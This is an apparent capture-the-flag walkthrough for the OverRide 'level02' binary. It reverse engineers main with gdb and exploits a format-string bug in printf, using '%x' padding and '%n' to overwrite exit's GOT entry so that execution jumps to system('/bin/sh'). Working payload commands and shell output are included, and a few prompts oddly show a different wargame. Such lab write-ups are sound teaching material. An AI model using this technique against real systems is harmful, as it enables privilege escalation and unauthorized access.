# Walkthrough

So, I found a binary file named `"level02"` in the home directory. When I ran it, it prompted me to enter a username and password to connect to the program.

```sh
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA
--[ Password: BBBB
*****************************************
AAAA does not have access!
```

I wanted to get a better understanding of how it works, so I decided to reverse engineer it using `gdb`. I started by disassembling the main function.

Here's what I found: The `main` function clears three buffers, and then it opens the `"/home/users/level03/.pass"` file in read mode using the `fopen` function. If it fails to open the file, it displays the error message `"ERROR: failed to open password file\n"` with the fwrite function in standard error and exits the program. But if it's opened successfully, it reads the file's contents using `fread` function and stores them in a buffer. Then, it uses the `strcspn` function to find the length of the substring before the first occurrence of `"\n"` in the buffer. It then uses the return value of the `strcspn` function as the index of the buffer and changes its value to 0. After that, the program checks if the size read from the last `fread` function is equal to `41`. If it's not, it shows the error message `"ERROR: failed to read password file\n"` using `fwrite` function in standard output and exits.

```s
   0x000000000040082c <+24>: lea    rdx,[rbp-0x70]
   0x0000000000400830 <+28>: mov    eax,0x0
   0x0000000000400835 <+33>: mov    ecx,0xc
   0x000000000040083a <+38>: mov    rdi,rdx
   0x000000000040083d <+41>: rep stos QWORD PTR es:[rdi],rax
   0x0000000000400840 <+44>: mov    rdx,rdi
   0x0000000000400843 <+47>: mov    DWORD PTR [rdx],eax
   0x0000000000400845 <+49>: add    rdx,0x4
   0x0000000000400849 <+53>: lea    rdx,[rbp-0xa0]
   0x0000000000400850 <+60>: mov    eax,0x0
   0x0000000000400855 <+65>: mov    ecx,0x5
   0x000000000040085a <+70>: mov    rdi,rdx
   0x000000000040085d <+73>: rep stos QWORD PTR es:[rdi],rax
   0x0000000000400860 <+76>: mov    rdx,rdi
   0x0000000000400863 <+79>: mov    BYTE PTR [rdx],al
   0x0000000000400865 <+81>: add    rdx,0x1
   0x0000000000400869 <+85>: lea    rdx,[rbp-0x110]
   0x0000000000400870 <+92>: mov    eax,0x0
   0x0000000000400875 <+97>: mov    ecx,0xc
   0x000000000040087a <+102>: mov    rdi,rdx
   0x000000000040087d <+105>: rep stos QWORD PTR es:[rdi],rax
   0x0000000000400880 <+108>: mov    rdx,rdi
   0x0000000000400883 <+111>: mov    DWORD PTR [rdx],eax
   0x0000000000400885 <+113>: add    rdx,0x4
   0x0000000000400889 <+117>: mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000400891 <+125>: mov    DWORD PTR [rbp-0xc],0x0
   0x0000000000400898 <+132>: mov    edx,0x400bb0
   0x000000000040089d <+137>: mov    eax,0x400bb2
   0x00000000004008a2 <+142>: mov    rsi,rdx
   0x00000000004008a5 <+145>: mov    rdi,rax
   0x00000000004008a8 <+148>: call   0x400700 <fopen@plt>
   0x00000000004008ad <+153>: mov    QWORD PTR [rbp-0x8],rax
   0x00000000004008b1 <+157>: cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004008b6 <+162>: jne    0x4008e6 <main+210>
   0x00000000004008b8 <+164>: mov    rax,QWORD PTR [rip+0x200991]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x00000000004008bf <+171>: mov    rdx,rax
   0x00000000004008c2 <+174>: mov    eax,0x400bd0
   0x00000000004008c7 <+179>: mov    rcx,rdx
   0x00000000004008ca <+182>: mov    edx,0x24
   0x00000000004008cf <+187>: mov    esi,0x1
   0x00000000004008d4 <+192>: mov    rdi,rax
   0x00000000004008d7 <+195>: call   0x400720 <fwrite@plt>
   0x00000000004008dc <+200>: mov    edi,0x1
   0x00000000004008e1 <+205>: call   0x400710 <exit@plt>
   0x00000000004008e6 <+210>: lea    rax,[rbp-0xa0]
   0x00000000004008ed <+217>: mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004008f1 <+221>: mov    rcx,rdx
   0x00000000004008f4 <+224>: mov    edx,0x29
   0x00000000004008f9 <+229>: mov    esi,0x1
   0x00000000004008fe <+234>: mov    rdi,rax
   0x0000000000400901 <+237>: call   0x400690 <fread@plt>
   0x0000000000400906 <+242>: mov    DWORD PTR [rbp-0xc],eax
   0x0000000000400909 <+245>: lea    rax,[rbp-0xa0]
   0x0000000000400910 <+252>: mov    esi,0x400bf5
   0x0000000000400915 <+257>: mov    rdi,rax
   0x0000000000400918 <+260>: call   0x4006d0 <strcspn@plt>
   0x000000000040091d <+265>: mov    BYTE PTR [rbp+rax*1-0xa0],0x0
   0x0000000000400925 <+273>: cmp    DWORD PTR [rbp-0xc],0x29
   0x0000000000400929 <+277>: je     0x40097d <main+361>
   0x000000000040092b <+279>: mov    rax,QWORD PTR [rip+0x20091e]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400932 <+286>: mov    rdx,rax
   0x0000000000400935 <+289>: mov    eax,0x400bf8
   0x000000000040093a <+294>: mov    rcx,rdx
   0x000000000040093d <+297>: mov    edx,0x24
   0x0000000000400942 <+302>: mov    esi,0x1
   0x0000000000400947 <+307>: mov    rdi,rax
   0x000000000040094a <+310>: call   0x400720 <fwrite@plt>
   0x000000000040094f <+315>: mov    rax,QWORD PTR [rip+0x2008fa]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400956 <+322>: mov    rdx,rax
   0x0000000000400959 <+325>: mov    eax,0x400bf8
   0x000000000040095e <+330>: mov    rcx,rdx
   0x0000000000400961 <+333>: mov    edx,0x24
   0x0000000000400966 <+338>: mov    esi,0x1
   0x000000000040096b <+343>: mov    rdi,rax
   0x000000000040096e <+346>: call   0x400720 <fwrite@plt>
   0x0000000000400973 <+351>: mov    edi,0x1
   0x0000000000400978 <+356>: call   0x400710 <exit@plt>
```

Otherwise, the program prompts the user to enter a username using `fgets` function and stores it in another buffer. Then, it uses the `strcspn` function again to find the length of the substring before the first occurrence of `"\n"` in the last buffer, and changes its value to 0 using the index returned from the `strcspn` function.

```s
   0x00000000004009b1 <+413>: mov    eax,0x400cd9
   0x00000000004009b6 <+418>: mov    rdi,rax
   0x00000000004009b9 <+421>: mov    eax,0x0
   0x00000000004009be <+426>: call   0x4006c0 <printf@plt>
   0x00000000004009c3 <+431>: mov    rax,QWORD PTR [rip+0x20087e]        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>: mov    rdx,rax
   0x00000000004009cd <+441>: lea    rax,[rbp-0x70]
   0x00000000004009d1 <+445>: mov    esi,0x64
   0x00000000004009d6 <+450>: mov    rdi,rax
   0x00000000004009d9 <+453>: call   0x4006f0 <fgets@plt>
   0x00000000004009de <+458>: lea    rax,[rbp-0x70]
   0x00000000004009e2 <+462>: mov    esi,0x400bf5
   0x00000000004009e7 <+467>: mov    rdi,rax
   0x00000000004009ea <+470>: call   0x4006d0 <strcspn@plt>
   0x00000000004009ef <+475>: mov    BYTE PTR [rbp+rax*1-0x70],0x0
```

The same process is repeated for the password, which is retrieved from the input and stored in a new buffer using `fgets` function. Then, the value of the last buffer is changed with the index returned from a new `strcspn` function with the last buffer and `"\n"` as parameters.

```s
   0x00000000004009f4 <+480>: mov    eax,0x400ce8
   0x00000000004009f9 <+485>: mov    rdi,rax
   0x00000000004009fc <+488>: mov    eax,0x0
   0x0000000000400a01 <+493>: call   0x4006c0 <printf@plt>
   0x0000000000400a06 <+498>: mov    rax,QWORD PTR [rip+0x20083b]        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x0000000000400a0d <+505>: mov    rdx,rax
   0x0000000000400a10 <+508>: lea    rax,[rbp-0x110]
   0x0000000000400a17 <+515>: mov    esi,0x64
   0x0000000000400a1c <+520>: mov    rdi,rax
   0x0000000000400a1f <+523>: call   0x4006f0 <fgets@plt>
   0x0000000000400a24 <+528>: lea    rax,[rbp-0x110]
   0x0000000000400a2b <+535>: mov    esi,0x400bf5
   0x0000000000400a30 <+540>: mov    rdi,rax
   0x0000000000400a33 <+543>: call   0x4006d0 <strcspn@plt>
   0x0000000000400a38 <+548>: mov    BYTE PTR [rbp+rax*1-0x110],0x0
```

Finally, the program compares the content read from the file with the password. If they are not equal, it prints the username and the message `"does not have access!"` before exiting the program. But if they match, the program displays a message and starts a new shell process `(/bin/sh)` within the current process.

```s
   0x0000000000400a4a <+566>: lea    rcx,[rbp-0x110]
   0x0000000000400a51 <+573>: lea    rax,[rbp-0xa0]
   0x0000000000400a58 <+580>: mov    edx,0x29
   0x0000000000400a5d <+585>: mov    rsi,rcx
   0x0000000000400a60 <+588>: mov    rdi,rax
   0x0000000000400a63 <+591>: call   0x400670 <strncmp@plt>
   0x0000000000400a68 <+596>: test   eax,eax
   0x0000000000400a6a <+598>: jne    0x400a96 <main+642>
   0x0000000000400a6c <+600>: mov    eax,0x400d22
   0x0000000000400a71 <+605>: lea    rdx,[rbp-0x70]
   0x0000000000400a75 <+609>: mov    rsi,rdx
   0x0000000000400a78 <+612>: mov    rdi,rax
   0x0000000000400a7b <+615>: mov    eax,0x0
   0x0000000000400a80 <+620>: call   0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>: mov    edi,0x400d32
   0x0000000000400a8a <+630>: call   0x4006b0 <system@plt>
   0x0000000000400a8f <+635>: mov    eax,0x0
   0x0000000000400a94 <+640>: leave
   0x0000000000400a95 <+641>: ret
   0x0000000000400a96 <+642>: lea    rax,[rbp-0x70]
   0x0000000000400a9a <+646>: mov    rdi,rax
   0x0000000000400a9d <+649>: mov    eax,0x0
   0x0000000000400aa2 <+654>: call   0x4006c0 <printf@plt>
   0x0000000000400aa7 <+659>: mov    edi,0x400d3a
   0x0000000000400aac <+664>: call   0x400680 <puts@plt>
   0x0000000000400ab1 <+669>: mov    edi,0x1
   0x0000000000400ab6 <+674>: call   0x400710 <exit@plt>
```

Upon analyzing the code, it seems that there is a vulnerability in the `printf()` function known as a `format string` vulnerability. This type of vulnerability allows me to provide a format string that contains conversion specifications which enable me to reference memory locations that I am not authorized to access. By using certain conversion specifications like `%x`, `%p`, or `%n`, I can potentially read or write data from arbitrary memory locations.

In this particular case, the format string vulnerability allows me to overwrite the address of the `exit` function in the Global Offset Table `(GOT)` with the address of the `system` call, which will start a new shell process using the `"system"` function. This means that I can gain access to system-level privileges and execute arbitrary code.

Initially, I used the `x` conversion specifier to display the values in hexadecimal format. Subsequently, the resulting output appeared as follows:

```sh
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %x %x %x %x %x %x %x %x
--[ Password: AAAA
*****************************************
ffffe4c0 0 41 2a2a2a2a 2a2a2a2a ffffe6b8 f7ff9a08 41414141 does not have access!
```

In this example, the printf function printed a memory address followed by the value `41414141`, which represents the ASCII characters `"AAAA"`. This value was passed in the password. Based on this observation, I decided to pass the memory address of the `exit` function instead of the `AAAA` string to see if the output would include the inputted address:

In the given example, we will locate the address of the `exit` function.

```s
(gdb) disas 0x400710
Dump of assembler code for function exit@plt:
   0x0000000000400710 <+0>: jmp    QWORD PTR [rip+0x200b12]        # 0x601228 <exit@got.plt>
   0x0000000000400716 <+6>: push   0xa
   0x000000000040071b <+11>: jmp    0x400660
End of assembler dump.
```

To accomplish this, I utilized Python to generate the required strings:

```sh
level3@RainFall:~$ python2 -c 'print("\x60\x12\x28"[::-1])' > /tmp/password
level3@RainFall:~$ python2 -c 'print("%x " * 8)' > /tmp/username
level02@OverRide:~$ (cat /tmp/username; cat /tmp/password ) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
ffffe4c0 0 28 2a2a2a2a 2a2a2a2a ffffe6b8 f7ff9a08 601228  does not have access!
```

As we know, the `%n` conversion specifier can modify the value of the memory address passed to it. Therefore, I decided to replace the last %x conversion specifier with `%n` in the printf function call.

before using the `%n` conversion:

```s
(gdb) r < <(cat /tmp/username; cat /tmp/password)
Starting program: /home/users/level02/level02 < <(cat /tmp/username; cat /tmp/password)
(gdb) set {char [26]} 0x400bb2="/home/users/level02/.pass"
(gdb) x/wx 0x601228
0x601228 <exit@got.plt>: 0x00400716
```

after using the `%n` conversion:

```
level3@RainFall:~$ python2 -c 'print("%x " * 7 + "%n")' > /tmp/username
-------------------------------------------------------------------------
(gdb) r < <(cat /tmp/username; cat /tmp/password)
Starting program: /home/users/level02/level02 < <(cat /tmp/username; cat /tmp/password)
(gdb) set {char [26]} 0x400bb2="/home/users/level02/.pass"
(gdb) x/wx 0x601228
0x601228 <exit@got.plt>: 0x00000032
```

now, we need just to calculate the padding needed to change the value of the address `0x601228` to the address of the `system` call with the parameter `"/bin/sh"` passed to it in the `main` function `(0x400a85)`

```
>>> 0x400a85 + 8 - 50 // address + width of the last x conversion - the length of the last output (0x32)
4196955
```

And by performing this operation, we can use the generated payload to attempt to exploit the `level2` binary:

```sh
level02@OverRide:~$ python2 -c 'print("%x " * 6 + "%4196955x " + "%n")' > /tmp/username
level02@OverRide:~$ (cat /tmp/username; cat /tmp/password - ) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
ffffe4c0 0 28 2a2a2a2a 2a2a2a2a ffffe6b8 (after 4196947 space)f7ff9a08  does not have access!
whoami
level03
cd ../level03
ls -la
total 17
dr-xr-x---+ 1 level03 level03   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level03 level03  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level03 level03 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level04 users   7677 Sep 10  2016 level03
-rw-r--r--+ 1 level03 level03   41 Oct 19  2016 .pass
-rw-r--r--  1 level03 level03  675 Sep 10  2016 .profile
```